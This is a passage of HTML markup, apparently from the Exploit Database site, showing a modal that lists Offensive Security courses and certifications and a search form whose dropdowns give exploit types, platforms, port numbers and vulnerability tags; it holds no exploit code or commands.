            </div>

            <div class="modal-body">

                <table class="table dataTable table-borderless">

                            <thead>

                            <tr>
                                <th class="text-center"><strong>Downloads</strong></th>
                                <th class="text-center"><strong>Certifications</strong></th>
                                <th class="text-center"><strong>Training</strong></th>
                                <th class="text-center"><strong>Services</strong></th>
                            </tr>

                            </thead>

                            <tbody>

                            <tr class="text-center">

                                <td>
                                    <a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                                        Kali Linux
                                    </a>
                                </td>
                                <td>
                                    <a href="/pentest-training-with-kali-linux"
                                       target="_blank" rel="noopener">OSCP
                                    </a>
                                </td>
                                <td>
                                    <a href="/pentest-training-with-kali-linux"
                                       target="_blank" rel="noopener">Penetration Testing with Kali Linux (PWK) (PEN-200)
                                       <br />All new for 2020
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.offensive-security.com/penetration-testing/"
                                       target="_blank" rel="noopener">Penetration Testing
                                    </a>
                                </td>

                            </tr>

                            <tr class="text-center">

                                <td>
                                    <a href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                                       target="_blank" rel="noopener">
                                        Kali NetHunter
                                    </a>
                                </td>
                                <td>
                                    <a href="/wireless-attacks-training"
                                       target="_blank" rel="noopener">OSWP
                                    </a>
                                </td>
                                <td>
                                    <a href="/wireless-attacks-training"
                                       target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.offensive-security.com/penetration-testing/#other-services"
                                       target="_blank" rel="noopener">Advanced Attack Simulation
                                    </a>
                                </td>

                            </tr>

                            <tr class="text-center">

                                <td>
                                    <a href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                                       target="_blank" rel="noopener">Kali Linux Revealed Book
                                    </a>
                                </td>
                                <td>
                                    <a href="/evasion-techniques-breaching-defenses"
                                       target="_blank" rel="noopener">OSEP
                                    </a>
                                </td>
                                <td>
                                    <a href="/evasion-techniques-breaching-defenses"
                                       target="_blank" rel="noopener">Evasion Techniques and breaching Defences (PEN-300)
                                       <br />All new for 2020
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.offensive-security.com/penetration-testing/#asa"
                                       target="_blank" rel="noopener">Application Security Assessment
                                    </a>
                                </td>

                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="/advanced-web-attacks"
                                       target="_blank" rel="noopener">OSWE
                                    </a>
                                </td>
                                <td>
                                    <a href="/advanced-web-attacks"
                                       target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                                       <br />Updated for 2020
                                    </a>
                                </td>
                                <td></td>
                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="/windows-user-mode-exploit-development"
                                       target="_blank" rel="noopener">OSED
                                    </a>
                                </td>
                                <td>
                                    <a href="/windows-user-mode-exploit-development"
                                       target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                                       <br />All new for 2021
                                    </a>
                                </td>
                                <td></td>
                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="https://www.offensive-security.com/awe-osee/"
                                       target="_blank" rel="noopener">OSEE
                                    </a>
                                </td>
                                <td>
<!--
                                    <a href="https://www.offensive-security.com/metasploit-unleashed/"
                                       target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                                    </a>
-->
                                </td>
                                <td></td>
                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="https://kali.training/"
                                       target="_blank" rel="noopener">KLCP
                                    </a>
                                </td>
                                <td>
                                    <a href="https://kali.training/courses/kali-linux-revealed/" target="_blank"
                                       target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                                    </a>
                                </td>
                                <td></td>
                            </tr>

                            </tbody>

                        </table>

            </div>

            <div class="modal-footer">

                <button type="button"
                        class="btn btn-primary"
                        data-dismiss="modal">Close
                </button>

            </div>

        </div>

    </div>

</div>

    <!-- Advanced Search Modal -->
<div class="modal fade bd-example-modal-lg" id="search" tabindex="-1"
     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">

    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
         role="document">

        <div class="modal-content">

            <div class="modal-header">

                <h5 class="modal-title"
                    id="searchModalTitle">Search The Exploit Database
                </h5>

                <button type="button" class="close" data-dismiss="modal"
                        aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>

            </div>

            <div class="modal-body">

                <form action="https://www.exploit-db.com/search" method="GET" id="searchForm">

                    <div class="row">

                        <div class="col-sm-12 col-lg-8">

                            <div class="form-group">

                                <label for="titleSearch" class="control-label text-primary">Title</label>

                                <input id="titleSearch" class="form-control" type="text" name="q" class="q"
                                       placeholder="Title" value="" autofocus>

                            </div>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <div class="form-group">

                                <label for="cveSearch" class="control-label text-primary">CVE</label>

                                <input id="cveSearch" class="form-control" type="text" name="cve" class="cve"
                                       placeholder="2021-1234"
                                       value="" autofocus>

                            </div>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-sm-6 col-lg-4">

                            <label for="typeSearchSelect" class="text-primary">Type</label>

                            <select id="typeSearchSelect" name="type" class="form-control">

                                <option></option>
                                
                                    <option value="dos" >
                                        dos
                                    </option>


                                
                                    <option value="local" >
                                        local
                                    </option>


                                
                                    <option value="remote" >
                                        remote
                                    </option>


                                
                                    <option value="shellcode" >
                                        shellcode
                                    </option>


                                
                                    <option value="papers" >
                                        papers
                                    </option>


                                
                                    <option value="webapps" >
                                        webapps
                                    </option>


                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <label for="platformSearchSelect" class="text-primary">Platform</label>

                            <select id="platformSearchSelect" name="platform" class="form-control">

                                <option></option>
                                
                                    <option value="aix" >
                                        AIX
                                    </option>

                                
                                    <option value="asp" >
                                        ASP
                                    </option>

                                
                                    <option value="bsd" >
                                        BSD
                                    </option>

                                
                                    <option value="bsd_ppc" >
                                        BSD_PPC
                                    </option>

                                
                                    <option value="bsd_x86" >
                                        BSD_x86
                                    </option>

                                
                                    <option value="bsdi_x86" >
                                        BSDi_x86
                                    </option>

                                
                                    <option value="cgi" >
                                        CGI
                                    </option>

                                
                                    <option value="freebsd" >
                                        FreeBSD
                                    </option>

                                
                                    <option value="freebsd_x86" >
                                        FreeBSD_x86
                                    </option>

                                
                                    <option value="freebsd_x86-64" >
                                        FreeBSD_x86-64
                                    </option>

                                
                                    <option value="generator" >
                                        Generator
                                    </option>

                                
                                    <option value="hardware" >
                                        Hardware
                                    </option>

                                
                                    <option value="hp-ux" >
                                        HP-UX
                                    </option>

                                
                                    <option value="irix" >
                                        IRIX
                                    </option>

                                
                                    <option value="jsp" >
                                        JSP
                                    </option>

                                
                                    <option value="linux" >
                                        Linux
                                    </option>

                                
                                    <option value="linux_mips" >
                                        Linux_MIPS
                                    </option>

                                
                                    <option value="linux_ppc" >
                                        Linux_PPC
                                    </option>

                                
                                    <option value="linux_sparc" >
                                        Linux_SPARC
                                    </option>

                                
                                    <option value="linux_x86" >
                                        Linux_x86
                                    </option>

                                
                                    <option value="linux_x86-64" >
                                        Linux_x86-64
                                    </option>

                                
                                    <option value="minix" >
                                        MINIX
                                    </option>

                                
                                    <option value="multiple" >
                                        Multiple
                                    </option>

                                
                                    <option value="netbsd_x86" >
                                        NetBSD_x86
                                    </option>

                                
                                    <option value="novell" >
                                        Novell
                                    </option>

                                
                                    <option value="openbsd" >
                                        OpenBSD
                                    </option>

                                
                                    <option value="openbsd_x86" >
                                        OpenBSD_x86
                                    </option>

                                
                                    <option value="osx_ppc" >
                                        OSX_PPC
                                    </option>

                                
                                    <option value="osx" >
                                        OSX
                                    </option>

                                
                                    <option value="php" >
                                        PHP
                                    </option>

                                
                                    <option value="plan9" >
                                        Plan9
                                    </option>

                                
                                    <option value="qnx" >
                                        QNX
                                    </option>

                                
                                    <option value="sco" >
                                        SCO
                                    </option>

                                
                                    <option value="sco_x86" >
                                        SCO_x86
                                    </option>

                                
                                    <option value="solaris" >
                                        Solaris
                                    </option>

                                
                                    <option value="solaris_sparc" >
                                        Solaris_SPARC
                                    </option>

                                
                                    <option value="solaris_x86" >
                                        Solaris_x86
                                    </option>

                                
                                    <option value="tru64" >
                                        Tru64
                                    </option>

                                
                                    <option value="ultrix" >
                                        ULTRIX
                                    </option>

                                
                                    <option value="unix" >
                                        Unix
                                    </option>

                                
                                    <option value="unixware" >
                                        UnixWare
                                    </option>

                                
                                    <option value="windows_x86" >
                                        Windows_x86
                                    </option>

                                
                                    <option value="windows_x86-64" >
                                        Windows_x86-64
                                    </option>

                                
                                    <option value="windows" >
                                        Windows
                                    </option>

                                
                                    <option value="arm" >
                                        ARM
                                    </option>

                                
                                    <option value="cfm" >
                                        CFM
                                    </option>

                                
                                    <option value="netware" >
                                        Netware
                                    </option>

                                
                                    <option value="superh_sh4" >
                                        SuperH_SH4
                                    </option>

                                
                                    <option value="java" >
                                        Java
                                    </option>

                                
                                    <option value="beos" >
                                        BeOS
                                    </option>

                                
                                    <option value="immunix" >
                                        Immunix
                                    </option>

                                
                                    <option value="palm_os" >
                                        Palm_OS
                                    </option>

                                
                                    <option value="atheos" >
                                        AtheOS
                                    </option>

                                
                                    <option value="ios" >
                                        iOS
                                    </option>

                                
                                    <option value="android" >
                                        Android
                                    </option>

                                
                                    <option value="xml" >
                                        XML
                                    </option>

                                
                                    <option value="perl" >
                                        Perl
                                    </option>

                                
                                    <option value="python" >
                                        Python
                                    </option>

                                
                                    <option value="system_z" >
                                        System_z
                                    </option>

                                
                                    <option value="json" >
                                        JSON
                                    </option>

                                
                                    <option value="ashx" >
                                        ASHX
                                    </option>

                                
                                    <option value="ruby" >
                                        Ruby
                                    </option>

                                
                                    <option value="aspx" >
                                        ASPX
                                    </option>

                                
                                    <option value="macos" >
                                        macOS
                                    </option>

                                
                                    <option value="linux_crisv32" >
                                        Linux_CRISv32
                                    </option>

                                
                                    <option value="ezine" >
                                        eZine
                                    </option>

                                
                                    <option value="magazine" >
                                        Magazine
                                    </option>

                                
                                    <option value="nodejs" >
                                        NodeJS
                                    </option>

                                
                                    <option value="alpha" >
                                        Alpha
                                    </option>

                                
                                    <option value="solaris_mips" >
                                        Solaris_MIPS
                                    </option>

                                
                                    <option value="lua" >
                                        Lua
                                    </option>

                                
                                    <option value="watchos" >
                                        watchOS
                                    </option>

                                
                                    <option value="vxworks" >
                                        VxWorks
                                    </option>

                                
                                    <option value="python2" >
                                        Python2
                                    </option>

                                
                                    <option value="python3" >
                                        Python3
                                    </option>

                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <div class="form-group">

                                <label for="authorSearch" class="text-primary">Author</label>

                                <input id="authorSearch" class="form-control" type="text" name="e_author"
                                       placeholder="Author" value="">

                            </div>
                        </div>

                    </div>

                    <div class="row">

                        <div class="col-sm-12 col-lg-6">

                            <div class="form-group">

                                <label for="textSearch" class="control-label text-primary">Content</label>

                                <input id="textSearch" class="form-control" type="text" name="text"
                                       placeholder="Exploit content" value="">

                            </div>

                        </div>

                        <div class="col-sm-6 col-lg-2">

                            <label for="portSearchSelect" class="text-primary">Port</label>

                            <select id="portSearchSelect" name="port" class="form-control">

                                <option></option>
                                
                                    <option value="14" >
                                        14
                                    </option>


                                
                                    <option value="21" >
                                        21
                                    </option>


                                
                                    <option value="22" >
                                        22
                                    </option>


                                
                                    <option value="23" >
                                        23
                                    </option>


                                
                                    <option value="25" >
                                        25
                                    </option>


                                
                                    <option value="42" >
                                        42
                                    </option>


                                
                                    <option value="49" >
                                        49
                                    </option>


                                
                                    <option value="53" >
                                        53
                                    </option>


                                
                                    <option value="66" >
                                        66
                                    </option>


                                
                                    <option value="69" >
                                        69
                                    </option>


                                
                                    <option value="70" >
                                        70
                                    </option>


                                
                                    <option value="79" >
                                        79
                                    </option>


                                
                                    <option value="80" >
                                        80
                                    </option>


                                
                                    <option value="81" >
                                        81
                                    </option>


                                
                                    <option value="102" >
                                        102
                                    </option>


                                
                                    <option value="105" >
                                        105
                                    </option>


                                
                                    <option value="110" >
                                        110
                                    </option>


                                
                                    <option value="111" >
                                        111
                                    </option>


                                
                                    <option value="113" >
                                        113
                                    </option>


                                
                                    <option value="119" >
                                        119
                                    </option>


                                
                                    <option value="123" >
                                        123
                                    </option>


                                
                                    <option value="135" >
                                        135
                                    </option>


                                
                                    <option value="139" >
                                        139
                                    </option>


                                
                                    <option value="143" >
                                        143
                                    </option>


                                
                                    <option value="161" >
                                        161
                                    </option>


                                
                                    <option value="162" >
                                        162
                                    </option>


                                
                                    <option value="164" >
                                        164
                                    </option>


                                
                                    <option value="383" >
                                        383
                                    </option>


                                
                                    <option value="389" >
                                        389
                                    </option>


                                
                                    <option value="402" >
                                        402
                                    </option>


                                
                                    <option value="406" >
                                        406
                                    </option>


                                
                                    <option value="411" >
                                        411
                                    </option>


                                
                                    <option value="443" >
                                        443
                                    </option>


                                
                                    <option value="444" >
                                        444
                                    </option>


                                
                                    <option value="445" >
                                        445
                                    </option>


                                
                                    <option value="446" >
                                        446
                                    </option>


                                
                                    <option value="502" >
                                        502
                                    </option>


                                
                                    <option value="504" >
                                        504
                                    </option>


                                
                                    <option value="513" >
                                        513
                                    </option>


                                
                                    <option value="514" >
                                        514
                                    </option>


                                
                                    <option value="515" >
                                        515
                                    </option>


                                
                                    <option value="532" >
                                        532
                                    </option>


                                
                                    <option value="548" >
                                        548
                                    </option>


                                
                                    <option value="554" >
                                        554
                                    </option>


                                
                                    <option value="555" >
                                        555
                                    </option>


                                
                                    <option value="617" >
                                        617
                                    </option>


                                
                                    <option value="623" >
                                        623
                                    </option>


                                
                                    <option value="631" >
                                        631
                                    </option>


                                
                                    <option value="655" >
                                        655
                                    </option>


                                
                                    <option value="689" >
                                        689
                                    </option>


                                
                                    <option value="783" >
                                        783
                                    </option>


                                
                                    <option value="787" >
                                        787
                                    </option>


                                
                                    <option value="808" >
                                        808
                                    </option>


                                
                                    <option value="873" >
                                        873
                                    </option>


                                
                                    <option value="888" >
                                        888
                                    </option>


                                
                                    <option value="901" >
                                        901
                                    </option>


                                
                                    <option value="998" >
                                        998
                                    </option>


                                
                                    <option value="1000" >
                                        1000
                                    </option>


                                
                                    <option value="1040" >
                                        1040
                                    </option>


                                
                                    <option value="1089" >
                                        1089
                                    </option>


                                
                                    <option value="1099" >
                                        1099
                                    </option>


                                
                                    <option value="1100" >
                                        1100
                                    </option>


                                
                                    <option value="1114" >
                                        1114
                                    </option>


                                
                                    <option value="1120" >
                                        1120
                                    </option>


                                
                                    <option value="1194" >
                                        1194
                                    </option>


                                
                                    <option value="1235" >
                                        1235
                                    </option>


                                
                                    <option value="1471" >
                                        1471
                                    </option>


                                
                                    <option value="1521" >
                                        1521
                                    </option>


                                
                                    <option value="1533" >
                                        1533
                                    </option>


                                
                                    <option value="1581" >
                                        1581
                                    </option>


                                
                                    <option value="1589" >
                                        1589
                                    </option>


                                
                                    <option value="1604" >
                                        1604
                                    </option>


                                
                                    <option value="1617" >
                                        1617
                                    </option>


                                
                                    <option value="1723" >
                                        1723
                                    </option>


                                
                                    <option value="1743" >
                                        1743
                                    </option>


                                
                                    <option value="1761" >
                                        1761
                                    </option>


                                
                                    <option value="1812" >
                                        1812
                                    </option>


                                
                                    <option value="1858" >
                                        1858
                                    </option>


                                
                                    <option value="1861" >
                                        1861
                                    </option>


                                
                                    <option value="1900" >
                                        1900
                                    </option>


                                
                                    <option value="1947" >
                                        1947
                                    </option>


                                
                                    <option value="2000" >
                                        2000
                                    </option>


                                
                                    <option value="2022" >
                                        2022
                                    </option>


                                
                                    <option value="2049" >
                                        2049
                                    </option>


                                
                                    <option value="2100" >
                                        2100
                                    </option>


                                
                                    <option value="2103" >
                                        2103
                                    </option>


                                
                                    <option value="2121" >
                                        2121
                                    </option>


                                
                                    <option value="2125" >
                                        2125
                                    </option>


                                
                                    <option value="2181" >
                                        2181
                                    </option>


                                
                                    <option value="2242" >
                                        2242
                                    </option>


                                
                                    <option value="2315" >
                                        2315
                                    </option>


                                
                                    <option value="2375" >
                                        2375
                                    </option>


                                
                                    <option value="2380" >
                                        2380
                                    </option>


                                
                                    <option value="2381" >
                                        2381
                                    </option>


                                
                                    <option value="2401" >
                                        2401
                                    </option>


                                
                                    <option value="2480" >
                                        2480
                                    </option>


                                
                                    <option value="2525" >
                                        2525
                                    </option>


                                
                                    <option value="2640" >
                                        2640
                                    </option>


                                
                                    <option value="2810" >
                                        2810
                                    </option>


                                
                                    <option value="2812" >
                                        2812
                                    </option>


                                
                                    <option value="2947" >
                                        2947
                                    </option>


                                
                                    <option value="2954" >
                                        2954
                                    </option>


                                
                                    <option value="2990" >
                                        2990
                                    </option>


                                
                                    <option value="3000" >
                                        3000
                                    </option>


                                
                                    <option value="3030" >
                                        3030
                                    </option>


                                
                                    <option value="3050" >
                                        3050
                                    </option>


                                
                                    <option value="3052" >
                                        3052
                                    </option>


                                
                                    <option value="3128" >
                                        3128
                                    </option>


                                
                                    <option value="3129" >
                                        3129
                                    </option>


                                
                                    <option value="3181" >
                                        3181
                                    </option>


                                
                                    <option value="3200" >
                                        3200
                                    </option>


                                
                                    <option value="3217" >
                                        3217
                                    </option>


                                
                                    <option value="3306" >
                                        3306
                                    </option>


                                
                                    <option value="3333" >
                                        3333
                                    </option>


                                
                                    <option value="3378" >
                                        3378
                                    </option>


                                
                                    <option value="3389" >
                                        3389
                                    </option>


                                
                                    <option value="3460" >
                                        3460
                                    </option>


                                
                                    <option value="3465" >
                                        3465
                                    </option>


                                
                                    <option value="3500" >
                                        3500
                                    </option>


                                
                                    <option value="3535" >
                                        3535
                                    </option>


                                
                                    <option value="3632" >
                                        3632
                                    </option>


                                
                                    <option value="3690" >
                                        3690
                                    </option>


                                
                                    <option value="3790" >
                                        3790
                                    </option>


                                
                                    <option value="3814" >
                                        3814
                                    </option>


                                
                                    <option value="3817" >
                                        3817
                                    </option>


                                
                                    <option value="4000" >
                                        4000
                                    </option>


                                
                                    <option value="4002" >
                                        4002
                                    </option>


                                
                                    <option value="4070" >
                                        4070
                                    </option>


                                
                                    <option value="4081" >
                                        4081
                                    </option>


                                
                                    <option value="4105" >
                                        4105
                                    </option>


                                
                                    <option value="4111" >
                                        4111
                                    </option>


                                
                                    <option value="4322" >
                                        4322
                                    </option>


                                
                                    <option value="4343" >
                                        4343
                                    </option>


                                
                                    <option value="4434" >
                                        4434
                                    </option>


                                
                                    <option value="4501" >
                                        4501
                                    </option>


                                
                                    <option value="4555" >
                                        4555
                                    </option>


                                
                                    <option value="4592" >
                                        4592
                                    </option>


                                
                                    <option value="4661" >
                                        4661
                                    </option>


                                
                                    <option value="4750" >
                                        4750
                                    </option>


                                
                                    <option value="4848" >
                                        4848
                                    </option>


                                
                                    <option value="5000" >
                                        5000
                                    </option>


                                
                                    <option value="5060" >
                                        5060
                                    </option>


                                
                                    <option value="5061" >
                                        5061
                                    </option>


                                
                                    <option value="5080" >
                                        5080
                                    </option>


                                
                                    <option value="5081" >
                                        5081
                                    </option>


                                
                                    <option value="5093" >
                                        5093
                                    </option>


                                
                                    <option value="5151" >
                                        5151
                                    </option>


                                
                                    <option value="5180" >
                                        5180
                                    </option>


                                
                                    <option value="5247" >
                                        5247
                                    </option>


                                
                                    <option value="5250" >
                                        5250
                                    </option>


                                
                                    <option value="5272" >
                                        5272
                                    </option>


                                
                                    <option value="5308" >
                                        5308
                                    </option>


                                
                                    <option value="5432" >
                                        5432
                                    </option>


                                
                                    <option value="5466" >
                                        5466
                                    </option>


                                
                                    <option value="5554" >
                                        5554
                                    </option>


                                
                                    <option value="5555" >
                                        5555
                                    </option>


                                
                                    <option value="5600" >
                                        5600
                                    </option>


                                
                                    <option value="5655" >
                                        5655
                                    </option>


                                
                                    <option value="5666" >
                                        5666
                                    </option>


                                
                                    <option value="5800" >
                                        5800
                                    </option>


                                
                                    <option value="5803" >
                                        5803
                                    </option>


                                
                                    <option value="5814" >
                                        5814
                                    </option>


                                
                                    <option value="5858" >
                                        5858
                                    </option>


                                
                                    <option value="5900" >
                                        5900
                                    </option>


                                
                                    <option value="5984" >
                                        5984
                                    </option>


                                
                                    <option value="6066" >
                                        6066
                                    </option>


                                
                                    <option value="6070" >
                                        6070
                                    </option>


                                
                                    <option value="6080" >
                                        6080
                                    </option>


                                
                                    <option value="6082" >
                                        6082
                                    </option>


                                
                                    <option value="6101" >
                                        6101
                                    </option>


                                
                                    <option value="6112" >
                                        6112
                                    </option>


                                
                                    <option value="6129" >
                                        6129
                                    </option>


                                
                                    <option value="6379" >
                                        6379
                                    </option>


                                
                                    <option value="6502" >
                                        6502
                                    </option>


                                
                                    <option value="6503" >
                                        6503
                                    </option>


                                
                                    <option value="6660" >
                                        6660
                                    </option>


                                
                                    <option value="6667" >
                                        6667
                                    </option>


                                
                                    <option value="7001" >
                                        7001
                                    </option>


                                
                                    <option value="7002" >
                                        7002
                                    </option>


                                
                                    <option value="7070" >
                                        7070
                                    </option>


                                
                                    <option value="7071" >
                                        7071
                                    </option>


                                
                                    <option value="7080" >
                                        7080
                                    </option>


                                
                                    <option value="7100" >
                                        7100
                                    </option>


                                
                                    <option value="7144" >
                                        7144
                                    </option>


                                
                                    <option value="7210" >
                                        7210
                                    </option>


                                
                                    <option value="7272" >
                                        7272
                                    </option>


                                
                                    <option value="7290" >
                                        7290
                                    </option>


                                
                                    <option value="7426" >
                                        7426
                                    </option>


                                
                                    <option value="7443" >
                                        7443
                                    </option>


                                
                                    <option value="7510" >
                                        7510
                                    </option>


                                
                                    <option value="7547" >
                                        7547
                                    </option>


                                
                                    <option value="7649" >
                                        7649
                                    </option>


                                
                                    <option value="7770" >
                                        7770
                                    </option>


                                
                                    <option value="7777" >
                                        7777
                                    </option>


                                
                                    <option value="7778" >
                                        7778
                                    </option>


                                
                                    <option value="7787" >
                                        7787
                                    </option>


                                
                                    <option value="7879" >
                                        7879
                                    </option>


                                
                                    <option value="7902" >
                                        7902
                                    </option>


                                
                                    <option value="8000" >
                                        8000
                                    </option>


                                
                                    <option value="8001" >
                                        8001
                                    </option>


                                
                                    <option value="8002" >
                                        8002
                                    </option>


                                
                                    <option value="8004" >
                                        8004
                                    </option>


                                
                                    <option value="8008" >
                                        8008
                                    </option>


                                
                                    <option value="8020" >
                                        8020
                                    </option>


                                
                                    <option value="8022" >
                                        8022
                                    </option>


                                
                                    <option value="8023" >
                                        8023
                                    </option>


                                
                                    <option value="8028" >
                                        8028
                                    </option>


                                
                                    <option value="8030" >
                                        8030
                                    </option>


                                
                                    <option value="8080" >
                                        8080
                                    </option>


                                
                                    <option value="8081" >
                                        8081
                                    </option>


                                
                                    <option value="8082" >
                                        8082
                                    </option>


                                
                                    <option value="8088" >
                                        8088
                                    </option>


                                
                                    <option value="8090" >
                                        8090
                                    </option>


                                
                                    <option value="8181" >
                                        8181
                                    </option>


                                
                                    <option value="8300" >
                                        8300
                                    </option>


                                
                                    <option value="8400" >
                                        8400
                                    </option>


                                
                                    <option value="8443" >
                                        8443
                                    </option>


                                
                                    <option value="8445" >
                                        8445
                                    </option>


                                
                                    <option value="8473" >
                                        8473
                                    </option>


                                
                                    <option value="8500" >
                                        8500
                                    </option>


                                
                                    <option value="8585" >
                                        8585
                                    </option>


                                
                                    <option value="8619" >
                                        8619
                                    </option>


                                
                                    <option value="8800" >
                                        8800
                                    </option>


                                
                                    <option value="8812" >
                                        8812
                                    </option>


                                
                                    <option value="8839" >
                                        8839
                                    </option>


                                
                                    <option value="8880" >
                                        8880
                                    </option>


                                
                                    <option value="8888" >
                                        8888
                                    </option>


                                
                                    <option value="9000" >
                                        9000
                                    </option>


                                
                                    <option value="9001" >
                                        9001
                                    </option>


                                
                                    <option value="9002" >
                                        9002
                                    </option>


                                
                                    <option value="9080" >
                                        9080
                                    </option>


                                
                                    <option value="9090" >
                                        9090
                                    </option>


                                
                                    <option value="9091" >
                                        9091
                                    </option>


                                
                                    <option value="9100" >
                                        9100
                                    </option>


                                
                                    <option value="9124" >
                                        9124
                                    </option>


                                
                                    <option value="9200" >
                                        9200
                                    </option>


                                
                                    <option value="9251" >
                                        9251
                                    </option>


                                
                                    <option value="9256" >
                                        9256
                                    </option>


                                
                                    <option value="9443" >
                                        9443
                                    </option>


                                
                                    <option value="9447" >
                                        9447
                                    </option>


                                
                                    <option value="9784" >
                                        9784
                                    </option>


                                
                                    <option value="9788" >
                                        9788
                                    </option>


                                
                                    <option value="9855" >
                                        9855
                                    </option>


                                
                                    <option value="9876" >
                                        9876
                                    </option>


                                
                                    <option value="9900" >
                                        9900
                                    </option>


                                
                                    <option value="9987" >
                                        9987
                                    </option>


                                
                                    <option value="9993" >
                                        9993
                                    </option>


                                
                                    <option value="9999" >
                                        9999
                                    </option>


                                
                                    <option value="10000" >
                                        10000
                                    </option>


                                
                                    <option value="10001" >
                                        10001
                                    </option>


                                
                                    <option value="10080" >
                                        10080
                                    </option>


                                
                                    <option value="10202" >
                                        10202
                                    </option>


                                
                                    <option value="10203" >
                                        10203
                                    </option>


                                
                                    <option value="10443" >
                                        10443
                                    </option>


                                
                                    <option value="10616" >
                                        10616
                                    </option>


                                
                                    <option value="11000" >
                                        11000
                                    </option>


                                
                                    <option value="11211" >
                                        11211
                                    </option>


                                
                                    <option value="11460" >
                                        11460
                                    </option>


                                
                                    <option value="12203" >
                                        12203
                                    </option>


                                
                                    <option value="12221" >
                                        12221
                                    </option>


                                
                                    <option value="12345" >
                                        12345
                                    </option>


                                
                                    <option value="12397" >
                                        12397
                                    </option>


                                
                                    <option value="12401" >
                                        12401
                                    </option>


                                
                                    <option value="13327" >
                                        13327
                                    </option>


                                
                                    <option value="13701" >
                                        13701
                                    </option>


                                
                                    <option value="13722" >
                                        13722
                                    </option>


                                
                                    <option value="13838" >
                                        13838
                                    </option>


                                
                                    <option value="16992" >
                                        16992
                                    </option>


                                
                                    <option value="18821" >
                                        18821
                                    </option>


                                
                                    <option value="18881" >
                                        18881
                                    </option>


                                
                                    <option value="19000" >
                                        19000
                                    </option>


                                
                                    <option value="19810" >
                                        19810
                                    </option>


                                
                                    <option value="19813" >
                                        19813
                                    </option>


                                
                                    <option value="20000" >
                                        20000
                                    </option>


                                
                                    <option value="20002" >
                                        20002
                                    </option>


                                
                                    <option value="20010" >
                                        20010
                                    </option>


                                
                                    <option value="20031" >
                                        20031
                                    </option>


                                
                                    <option value="20111" >
                                        20111
                                    </option>


                                
                                    <option value="20171" >
                                        20171
                                    </option>


                                
                                    <option value="22003" >
                                        22003
                                    </option>


                                
                                    <option value="23423" >
                                        23423
                                    </option>


                                
                                    <option value="25672" >
                                        25672
                                    </option>


                                
                                    <option value="26000" >
                                        26000
                                    </option>


                                
                                    <option value="27015" >
                                        27015
                                    </option>


                                
                                    <option value="27700" >
                                        27700
                                    </option>


                                
                                    <option value="28015" >
                                        28015
                                    </option>


                                
                                    <option value="30000" >
                                        30000
                                    </option>


                                
                                    <option value="30303" >
                                        30303
                                    </option>


                                
                                    <option value="31337" >
                                        31337
                                    </option>


                                
                                    <option value="32400" >
                                        32400
                                    </option>


                                
                                    <option value="32674" >
                                        32674
                                    </option>


                                
                                    <option value="32764" >
                                        32764
                                    </option>


                                
                                    <option value="34205" >
                                        34205
                                    </option>


                                
                                    <option value="37215" >
                                        37215
                                    </option>


                                
                                    <option value="37777" >
                                        37777
                                    </option>


                                
                                    <option value="37848" >
                                        37848
                                    </option>


                                
                                    <option value="38292" >
                                        38292
                                    </option>


                                
                                    <option value="40007" >
                                        40007
                                    </option>


                                
                                    <option value="41523" >
                                        41523
                                    </option>


                                
                                    <option value="44334" >
                                        44334
                                    </option>


                                
                                    <option value="46824" >
                                        46824
                                    </option>


                                
                                    <option value="48080" >
                                        48080
                                    </option>


                                
                                    <option value="49152" >
                                        49152
                                    </option>


                                
                                    <option value="50000" >
                                        50000
                                    </option>


                                
                                    <option value="50496" >
                                        50496
                                    </option>


                                
                                    <option value="52311" >
                                        52311
                                    </option>


                                
                                    <option value="52789" >
                                        52789
                                    </option>


                                
                                    <option value="52869" >
                                        52869
                                    </option>


                                
                                    <option value="52986" >
                                        52986
                                    </option>


                                
                                    <option value="53413" >
                                        53413
                                    </option>


                                
                                    <option value="54345" >
                                        54345
                                    </option>


                                
                                    <option value="54890" >
                                        54890
                                    </option>


                                
                                    <option value="55554" >
                                        55554
                                    </option>


                                
                                    <option value="55555" >
                                        55555
                                    </option>


                                
                                    <option value="56380" >
                                        56380
                                    </option>


                                
                                    <option value="57772" >
                                        57772
                                    </option>


                                
                                    <option value="58080" >
                                        58080
                                    </option>


                                
                                    <option value="62514" >
                                        62514
                                    </option>


                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <label for="tagSearchSelect" class="text-primary">Tag</label>

                            <select id="tagSearchSelect" name="tag" class="form-control">

                                <option></option>
                                
                                    <option value="1" >
                                        WordPress Core
                                    </option>


                                
                                    <option value="3" >
                                        Metasploit Framework (MSF)
                                    </option>


                                
                                    <option value="4" >
                                        WordPress Plugin
                                    </option>


                                
                                    <option value="7" >
                                        SQL Injection (SQLi)
                                    </option>


                                
                                    <option value="8" >
                                        Cross-Site Scripting (XSS)
                                    </option>


                                
                                    <option value="9" >
                                        File Inclusion (LFI/RFI)
                                    </option>


                                
                                    <option value="12" >
                                        Cross-Site Request Forgery (CSRF)
                                    </option>


                                
                                    <option value="13" >
                                        Denial of Service (DoS)
                                    </option>


                                
                                    <option value="14" >
                                        Code Injection
                                    </option>


                                
                                    <option value="15" >
                                        Command Injection
                                    </option>


                                
                                    <option value="16" >
                                        Authentication Bypass / Credentials Bypass (AB/CB)
                                    </option>


                                
